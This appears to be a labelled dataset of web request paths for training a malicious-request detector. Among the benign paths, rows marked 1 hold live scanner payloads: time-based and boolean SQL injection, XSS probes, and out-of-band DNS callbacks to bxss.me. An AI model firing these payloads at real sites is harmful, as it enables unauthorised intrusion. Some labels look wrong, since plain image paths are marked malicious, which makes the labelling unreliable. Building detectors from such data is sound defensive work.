request	label
/if(now()=sysdate(),sleep(12),0)/****/25187.htm	1
/**********/system/2021/12/20/013496837.shtml	0
/*******/js/jquery-1.12.4.js	1
"/****/' 'a'.concat(70-3).concat(22*4).concat(110).concat(65).concat(111).concat(73) (require'socket'
socket.gethostbyname('hitsv' 'zffaicrnc993a.bxss.me.')[3].to_s) '/tjj/zfxxgkml_2127/hygq_2064/list.html"	1
/****/2021/10/80523.html	0
/****/zt/yqfkzccs/sjzccs/202112/t20211216_3228674.html	0
/******/visitcount/visit.jsp?type=1&i_webid=1&i_columnid=1 and 1>1	1
/****/system/count/0036001/003000000000/window.location.href	1
/****/ccp/zwhd/202112/t20211215_3224087.html	0
/******/system/2019/08/12/012948477.shtml	0
/******/download/downfile.jsp?classid=0&filename=75a45d85bd6c4a2d8c6e0c9614767fef.doc' and 7626=7626 and 'yazo'='yazo	1
/**********/system/2021/08/18/013436563.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u79d1\u5e7b\u7f51\u6587	0
/**********/system/2021/09/02/013444555.shtml	0
/*******/202011/202011040959371052.html	0
/************/kehuxuzhi/	0
/***/800/11/25/26/11252666_866638.jpg	1
"/"""" """"a"""".concat(70-3).concat(22*4).concat(98).concat(90).concat(118).concat(71) (require""""socket""""
socket.gethostbyname(""""hitsc"""" """"dpwucwpi253fc.bxss.me."""")[3].to_s) """"/****/bmleft.html"	1
/*****/b-e732772.html	0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqsjt/index_1.html	0
/**********/system/2021/12/18/013496495.shtml	0
/*****/jishi	0
/*******/zwgk/czgk/bmjs/zzqdwgzbmyxsjg/zzqtzb/	0
"/zmhd'""""()&%<acx><script >69qy(9739)</script>/*****/hfswsj/"	1
/*******/qiye/b-e2286090.html	0
/*****/system/2010/06/10/010138997.shtml	1
/***/0/02/12/33/2123374_980021.jpg	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u6cb3\u5dde\u62c9\u9762\u9986	0
/*************/zwgk/tzgg/202112/t20211208_3209709.html	0
/**/system/2008/01/18/002339058.shtml	1
/****/zgsdt/2021_qydt/202112/t20211213_323221.html	0
/**********/system/2020/04/05/013132329.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u597d\u90bb\u5c45\u83dc\u7bee\u5b50\u4fbf\u5229\u5e97	0
/************/search.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl=16&websiteid=if(now()=sysdate(),sleep(15),0)	1
/**********/system/2021/11/29/013487375.shtml	0
/****/qzfwj/201801/t20180115_669049.html/index_1.html	0
/****/web/search?page=13&channelid=222832&searchword=\u5f20\u67f1&keyword=\u5f20\u67f1&perpage=20&outlinepage=10	0
/*******/qiye/b-e1686328.html	0
/***/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202109/t20210908_186463.html	0
/******/yw/1.shtml	0
/****/20200526/e101403289.html	0
/**********/system/more/219000000000000/0008/219000000000000_00000854.shtml	0
/*******/zwgk/zfxxgk/zfxxgknb_40939/2020/	0
/*****/2021_qydt	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u9171\u9999\u6e90\u719f\u98df\u5e97	0
/****/xxgkml/hygq_3720/rdhy/202108/t20210823_185998.html	0
"/' 'a'.concat(70-3).concat(22*4).concat(101).concat(68).concat(120).concat(79) (require'socket'
socket.gethostbyname('hitjy' 'ghwzrukc423a9.bxss.me.')[3].to_s) '/**/rest.css"	1
/****/gcdzyqzysjx/	0
/**********/system/2020/05/26/013170862.shtml	0
/zwxx_11337/****/201712/t20171218_640450.html	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1329914701&wbfileid=35732&codevalue=	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u65b0\u7a7a\u95f4\u8bbe\u8ba1\u5de5\u4f5c\u5ba4	0
/*******/qiye/b-e738590.html	0
/**********/system/2021/09/19/data:image/svg xml,<svg viewbox=	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5174\u6587\u519c\u4e1a\u79d1\u6280\u6709\u9650\u516c\u53f8	0
/***********/jinrongqihuo/guzhiqihuo/index' and 2*3*8=6*8 and 'i7vd'='i7vd_2.html	1
/****/bmkx/srsj/index.html	0
"/****/country/:countryid'""""()&%<acx><script >aha2(9500)</script>"	1
"/**/openemr/?site="""">alert(777);"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u535a\u96c5\u4ed5\u521b\u610f\u8bbe\u8ba1\u6709\u9650\u516c\u53f8	0
/***/0/00/11/03/110330_918075.jpg	0
/***/0/02/08/59/2085911_957622.jpg	0
/****/czgk/bmjs/zzqfyxt/zzqgyzzqtlfy/202108/t20210818_2979253.html	0
/**********/system/2018/12/28/012776255.shtml	0
/****/≥§Ω≠»˝Ω«÷ﬁ	1
/******/system/2021/01/22/javascript:void();	1
/***/600/10/44/63/10446310_700726.jpg	0
/*******/qiye/b-e1575835.html	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u7cbe\u76ca\u773c\u955c\u5e97	0
/*****/mswpmm/common/newaccount.aspx?ddlculture=alert(777)	1
/****/bmkx/sjsj/202108/w020210802599960673028.png	0
/******/_content/download.jsp?urltype=news.downloadattachurl%') or 6387=1918 /*&owner=1707212448&wbfileid=51419	1
/****/202104/t20210430_2807658.html	0
/****/kycg/zscq/jsly/	0
/******/jznews/images/bj.jpg	0
/****/20201009/e108110424.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrteqf5 b13o zh5sb4ppaed4=&openid=ovl7jjog5c_q7if02ix-b_jcrb0s&outer_str=24690&activate_ticket=fdzv9emqaffrnr3xboqhbw9d5upolzbuonvvdpc0mtpoo8dbj5 fzedtzplsmcardqc7in/s/mcolc3wz9ny8q4nybi0j/nvt2diaanzjuk=	0
/*******/qiye/e142659771.html	0
/****/mjx/tpbd	0
/******/system/2019/06/22/012910078.shtml	0
/********/fortunewheel/view/static/js/1.85b81ed1fa76d1961b2a.js	0
/***/interface/comul_total.json.jsp?callback=jquery19108586321751731303_1639972881216	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(603)"">?_=1630311529405"	1
/*******/zwgk/czgk/bmyjs/qtdw/zzqgatjjzd/	0
"/************/template'""""()&%<acx><script >cfou(9139)</script>/jcse/110105008056111/16/images/result.css"	1
/*/public/viewclick/?addclick=1&classid=-1; waitfor delay '0:0:30.612000000000002' -- &id=179	1
/****/qzfwj/201801/t20180115_668662.html/index_1.html	0
/**********/system/2020/05/31/013174361.shtml	0
/ztzl%' and 2*3*8=6*8 and 'ctt0'!='ctt0%/******/ywdt/10.htm	1
/*********/20191010/javascript:void(0);	1
/****/bmkx/sczj/201805/t20180523_103706.html	0
/**/system/2007/03/23/002086471.shtml	0
/******/usercenter/index?qrcode=quicklyrq,3,19370,17794&code=011zgyga13t5lc0y0nia1xje3w3zgygy	0
/**********/system/2020/11/17/013285364.shtml	0
/****/byyw/201812/t20181213_112433.html	0
"/**/ui/lib/"""" """"a"""".concat(70-3).concat(22*4).concat(111).concat(88).concat(116).concat(84) (require""""socket""""
socket.gethostbyname(""""hityq"""" """"xhaspufx0f9a5.bxss.me."""")[3].to_s) """"/jquery.min.js"	1
/**********/system/2021/12/19/013496761.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6b27\u683c\u5316\u5986\u54c1\u5e97	0
/****/xxgkml/qtfdxx/jytabl_3722/ztqk/202112/t20211201_197139.html	0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/gytdsdfwzs/zws/zcwj.htm	1
"/****/gw_admin.php?a="""">alert(777);&t=settings"	1
/**********/system/2020/06/01/013175299.shtml	0
"/************/template/jcse/110105008056111/"""" """"a"""".concat(70-3).concat(22*4).concat(105).concat(81).concat(107).concat(90) (require""""socket""""
socket.gethostbyname(""""hitsc"""" """"jnfdacnzeb9ea.bxss.me."""")[3].to_s) """"/images/plugin/waterpull/pinterest_grid.js"	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4f55\u9e4f\u79cd\u690d\u573a	0
/****/xydt/2016hydt/201606/t20160612_87988.html	0
/**********/system/2021/10/14/013464414.shtml	0
/***/659.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u9e23\u6c99\u9547\u53cc\u51e4\u6c34\u679c\u852c\u83dc\u5e97	0
/****/bmkx/sfpb/index_22.html	0
/****/8_84.html	0
/***/0/00/53/48/534889_135577.jpg	0
/****/backup.php	1
/*************/zwgk/zfgb/2020/202008/p020200806355218107305.pdf	0
/mac-application/***/page/30	0
/*****/system/2010/12/02/010244433.shtml	0
"/****/zzxxgk/tjj/zfxxgkml_"""" """"a"""".concat(70-3).concat(22*4).concat(113).concat(73).concat(121).concat(70) (require""""socket""""
socket.gethostbyname(""""hitic"""" """"tunbausva18e2.bxss.me."""")[3].to_s) """"/jytabljg_2061/list.html"	1
/****/	0
/**/wp-content/plugins/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645	1
/******/system/2009/04/17/002726332.shtml	0
/******/usercenter/index?qrcode=12779&code=001cvwga1m0ulc0c7via1mpcwg1cvwgi	0
/zwxx_11337/****/201706/t20170620_312434.html	0
"/****/' 'a'.concat(70-3).concat(22*4).concat(107).concat(68).concat(114).concat(89) (require'socket'
socket.gethostbyname('hitlr' 'fyirxiek98f5b.bxss.me.')[3].to_s) '/201610/t20161016_531.html"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5f00\u65fa\u4fe1\u606f\u79d1\u6280\u6709\u9650\u516c\u53f8	0
//***********/zfxxgk/fdzdgknr/qtfdxx/	1
"/****/czgk/bmjs/zzqfyxt/yzqrmfy/201805/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
/*******/qiye/20211118/e139409079.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u7f8e\u561a\u54fc\u5c0f\u5403\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u94f6\u53cc\u6559\u80b2\u54a8\u8be2\u670d\u52a1\u90e8	0
/****/xqdt/jyx/201610/t20161025_47839.html	0
/****/b-e1263404.html	0
/****/b-e740977.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u963f\u7c73\u4e43\u9970\u54c1\u5e97	0
/****/ltgsz.com?n=01	0
"/************/template/jcse/' 'a'.concat(70-3).concat(22*4).concat(101).concat(90).concat(111).concat(77) (require'socket'
socket.gethostbyname('hitnn' 'frjkvnby29f12.bxss.me.')[3].to_s) '/16/images/css.js"	1
/**********/system/2021/11/20/013483011.shtml	0
"/****/admin/edit.php?title="""">pt>alert(777);< /script>pt>"	1
/**********/system/2016/01/04/011904013.shtml	0
/************/search.do?begin=20201023&end=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=«Î ‰»Îπÿº¸¥ &searchid=44&tpl=16&websiteid=110105008056111	1
/****/zfxxgk1/fdzdgknr.htm	1
/****/qtgz/index_2.html	0
/*****/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319	1
/******/download/downfile.jsp?classid=0&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls') and 9803=1504 and ('kgic'='kgic	1
/****/zt/jczwgk/qtxs	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5305\u90ae	0
"/******/5/hanweb"""" and 2*3*8=6*8 and """"fwaa""""=""""fwaa.css"	1
/***/blockdata/getsearchinfo.do?&title=\u6842\u6797\u675c\u83ab	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqmw/201908/t20190808_1655948.html	0
/**********/system/2021/08/05/013430845.shtml	0
/****/xqdt/jtx/201610/w020161025730205146853.jpg	0
/*****/index/detail/art_id/227.html	0
/**/ourbusiness/	1
/****/xqdt/hnx/202002/t20200203_147048.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u6d77\u57ce\u9547\u8f89\u714c\u6279\u53d1\u90e8	0
/****/bmkx/sgxw/201610/t20161025_36823.html	0
/****************/file/loadimage/?id=f7308e5d-13a1-4307-9908-3602763c8265	0
/vc' and 2*3*8=6*8 and 'd3c1'='d3c1/*****/login.do	1
/***/mobile_h5/wapshouye.do?channelid=chanjing/dichan	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u5927\u4e3a\u91d1\u76fe\u5546\u8d38\u6709\u9650\u516c\u53f8	0
/****/12689_71.jspx	0
"/**/abantecart/index.php?limit=""><script>alert(777);</script>&page=1""><script>alert(777);</script>&rt=product/special""><script>alert(777);</script>&sort=""><script>alert(777);</script>"	1
/************/template/http://bxss.me/t/fit.txt/110105008056111/16/images/plugin/analysis/jquery.windstagball.js	1
/****/system/2017/02/21/javascript:window.print()	1
/******/system/2019/09/02/012963616.shtml	0
/*******/201906041010484158	0
/**/system/2021/01/08/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u6d69\u91ce\u79cd\u82d7\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/zfwzjs/	0
/***/0/00/14/64/146444_227246.jpg	0
"/******/index.php?do=search&search=""><body onload=eval(alert(777)) ><!--"	1
/****/zhengce/zfwjn/201901/p020211119599960375961.pdf	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u01b8\u05b0\ufffd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/***/viewspace-814.html	0
/****/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script>	1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448') or 7534=7534 and '1'='1&wbfileid=51419	1
/*******/qiye/businesses-e46289_36.html?category_id=	0
"/**/wordpress/wp-content/plugins/securimage-wp/siwp_test.php/""""/>alert(777);?tested=1"	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u4e0b\u59dc\u6751	0
/****/gjys/' and 'x'='y	1
"/******/resource/storage/localupload.jsp?doaction=save&rid=1rnott09fg and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""""xor(if(now()=sysdate(),sleep(0),0))or""""*/&uptoken=1ff87566684b40c688f756b86e2c3798"	1
/***********/userservice.aspx?dbid=5);select sleep(5)	1
/************/template/jcse/110105008056111/16/images/plugin/selectpick/bxss.me/t/xss.html?	1
/***/003/004/472/00300447269_4da0ca65.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u7389\u5175\u9ec4\u91d1\u9999\u7116\u997c\u5e97	0
"/****/zt/jczwgk/plx/\""javascript:void(0)\"""	1
/******/web/messagebook/write.jsp?columnid=16%' and 'b%'='f	1
"/****/byszf/201610/t20161016_546.html?leader=’≈√˜ÁÙ'""""()&%<acx><script >j0rl(9045)</script>"	1
/***/003/003/889/00300388939_1c293b4d.jpg	0
/*******/202009/202009281713511190.html	0
/******/system/2017/09/04/012405880.shtml	0
/*************/zwxx_11337/sxdt/202112/t20211213_3217975.html	0
/**********/system/2021/12/20/013496834.shtml	0
/*******/userrole/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1	1
/*******/h3cc5.php	1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/gcjsbz_sjbz/1.htm	1
/****/zfxxgk/fdzdgknr/sfxm/xzsyxsfyzfxjjmlqd/202104/t20210427_2802650.html	0
/****/actionhandler/ajax_managed_services.php	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u7ff0\u5e7f\u5546\u884c	0
/****/zzxxgk/bmfgj/fgfzgg/fgjzfp/index_0.html	0
/***/0/10/93/90/10939053_626194.jpg	1
/******/457/bxss.me.2.1.js	1
"/****/ztly/"""" """"a"""".concat(70-3).concat(22*4).concat(99).concat(82).concat(107).concat(68) (require""""socket""""
socket.gethostbyname(""""hitzd"""" """"neowrpsh8cb0c.bxss.me."""")[3].to_s) """"/201911/t20191122_1859255.html"	1
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5357\u95e8\u5efa\u5e73\u7efc\u5408\u5546\u5e97	0
/****/bmkx/sgsj/202112/w020211220641728687828.jpg	0
/**********/system/2021/12/14/013494032.shtml	0
/****/xqdt/jtx/201610/t20161025_43459.html	0
/**/rstlt/js/top.js	0
/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/************/guzhiqihuo/index_2.html	1
/****/web/js/document.createelement(	1
/zwxx_11337/***/201902/t20190202_1273975.html	0
/***/interface/url_total_pv.json.jsp?callback=jquery19107149650742381015_1639980317498	0
/****/czgk/bmjs/zzqfyxt/hlxrmfy	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u4e0b\u9a6c\u5173\u9547\u53e3\u53e3\u9999\u5c0f\u5403\u5e97	0
"/****/server/news/show/title/time-for-a-heavy-harvest-new-release/src/""><script>alert(777)</script>@random4cd201e063d5c"	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u5510\u82b3\u5546\u5e97	0
/****/czgk/bmjs/zzqfyxt/zzqgyzzqtlfy/201908/p020190808577048516434.pdf	0
/**********/system/2021/05/10/013382948.shtml	0
/****/xxgkml/qtfdxx/jsjs/202105/t20210520_182800.html	0
/****/gczj.htm	1
/***/800/11/05/17/11051737_895800.jpg	1
/****/search.jspx?q=';window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();'	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u8700\u5148\u751f\u6c49\u7cfb\u8001\u706b\u9505\u65b0\u534e\u4e1c\u8857\u5e97	0
/****/wdszs/hfsz/202106/t20210622_183979.html	0
/****/0922/659485.shtml	0
/*****/gy48/cpgyss.asp?key=\u6df1\u5733\u5e02\u5fd7\u7f8e\u667a\u80fd\u79d1\u6280\u6709\u9650\u516c\u53f8&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/**********/system/2020/06/29/013194838.shtml	0
/*********/javascript:void(0);	1
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
"/****/index.php?show_record_links=1&table=products"""">alert(777);&add_new_item=1"	1
/***/0/10/33/47/10334781_993556.jpg	1
/*******/zwgk/czgk/bmyjs/zzqfyxt/ycszjrmfy/	0
/***/blockdata/articlelist_4g3.do?channelarticlelist_4g3_channelid_ss=channelid&channelid=shangye°Ëtpage=3&query=java	0
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12007,""place_id"":""fm_sp_ard"",""news_id"":""495354""}"	0
"/****/rdjy/202012<esi:include src=""""http://bxss.me/rpb.png""""/>/t20201225_2539623.html"	1
/******/hfjtsj/202109/t20210908_186482.html	0
/*****/b-e583572.html	0
/***/viewspace-803.html	0
"/******/zh-cn/htc/;""style='acu:expre/**/ssion(hnfw(9660))'bad="""	1
/******/system/2011/02/20/010291799.shtml	0
/****/bmkx/snmj/201907/w020190730599320977735.png	0
"/*/210607'""""()&%<acx><script >bery(9214)</script>/index/ef90f68c5578ccfd29b18250450d0233.css"	1
/****/zzxxgk/shenjiju/fdzdgknr_3749/lzyj_3750/bmwj/202109/t20210930_195017.html	0
/************/categorysearch.do?cateid=1&p=bxss.me&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl=16&websiteid=110105008056111	1
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u706b\u77f3\u5be8\u5e38\u6e05\u5c71\u6cc9\u6c34\u7ecf\u9500\u90e8	0
/**********/system/2020/05/08/013157108.shtml	0
/****/swb/ltgsz.com?n=11 and 9140=9140	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u59da\u53d1\u5ead\u67b8\u675e\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/******/visitcount/visit.jsp?type=2&i_columnid=37&i_webid=1' and 'x'='x	1
/****/mtgz/2021_mtgz/202111/w020211105615841728180.png	0
"/****/czgk/bmjs/zzqfyxt/xjxrmfy/202108/"">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a>"	0
/**/ico/an.png	0
"/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/bmwj/list.html?new='""""()&%<acx><script >c6xx(9025)</script>"	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u805a\u91d1\u9601\u670d\u88c5\u5e97	0
"/******/system/2021/06/09'""/><style>@import""javascript:alert(2341)"";</style>/013399706.shtml"	1
/****/b-e1167281.html	0
"/****/qzfwj/5619/5630/\""javascript:void(0)\"""	1
/***/0/01/12/46/1124646_982438.png	0
/***/0/02/06/31/2063196_546222.jpg	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u91d1\u79ef\u4f9b\u9500\u793e\u6587\u4f53\u767e\u8d27\u5546\u5e97	0
/********/images/nxrq_search_my.png?code=17cc9e163e5	0
/***/resource/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_0b4608db8f1110cd9047d408aaf9ac0c/><!--<textarea>	1
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12500,""place_id"":""fm_sp_ard"",""news_id"":""1152415""}"	0
/*******/pf46.php	1
/*****/gy48/cpgyss.asp?key=\u673a\u68b0\u4eba\u624d&l=\ufffd\ufffd\ufffd\ufffd	0
"/****/admin/edit.php?title="""">pt>alert(777);< /script>pt>"	1
/****/spjj/201707/t20170717_271850.html	0
/************/search.do?begin=20200819&end=20210819&eq=1&oq=1&p=1&pg=if(now()=sysdate(),sleep(15),0)&pos=filenumber&q=«Î ‰»Îπÿº¸¥ &searchid=44&tpl=16&websiteid=	1
/****/qzfwj/201801/t20180115_668713.html	0
/**********/system/2021/07/25/013425060.shtml	0
"/************/template/"""" """"a"""".concat(70-3).concat(22*4).concat(97).concat(66).concat(107).concat(88) (require""""socket""""
socket.gethostbyname(""""hitlu"""" """"kltuojrf688c2.bxss.me."""")[3].to_s) """"/110105008056111/16/images/plugin/selectpick/js.js"	1
/*******/inc/date.php	1
/*****/index/goods'||'/cate_id/179.html	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5473\u77e5\u82d1\u5e72\u9505	0
"/****/category/guojialingdaoren?page='""""()&%<acx><script >l452(9113)</script>"	1
/****/201907/t20190716_139789.html	0
"/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqmzt/202103/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5e7f\u4e1c\u529e\u4e8b\u5904</a>"	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u81f3\u5c0a\u4e3d\u4eba\u7f8e\u5bb9\u751f\u6d3b\u9986	0
/*****/system/2014/01/27/011297841.shtml	0
/****/czgk/bmjs/'.gethostbyname(lc('hitix'.'chuotzoy8615b.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(106).chr(82).chr(103).chr(80).'/	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u7199\u8bfa\u5c1a\u54c1\u5546\u884c	0
"/**/telaen/index.php?tid=default&lid=en_uk&f_email="""">alert(777)"	1
"/****/scripts/booking/eventlist.php?serviceid=1337"" onmouseover=""alert(777)"	1
/****/system/2019/06/29/012916142.shtml	0
/**********/system/2014/04/14/011370419.shtml	0
/******/20210425.jpg	0
/****/lybltj/202010/t20201013_172961.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4e45\u5c45\u9152\u5e97	0
/*****/system/2015/09/09/011815048.shtml	0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/1.htm	1
"/***/2021/10/12/art'""""()&%<acx><script >kunb(9856)</script>_32_242398.html"	1
/****/zgsdt/2019_qydt/201910/t20191028_225279.html	0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' or 2010=7256 and '%%'='%	1
/**********/system/2021/10/21/javascript:window.print()	1
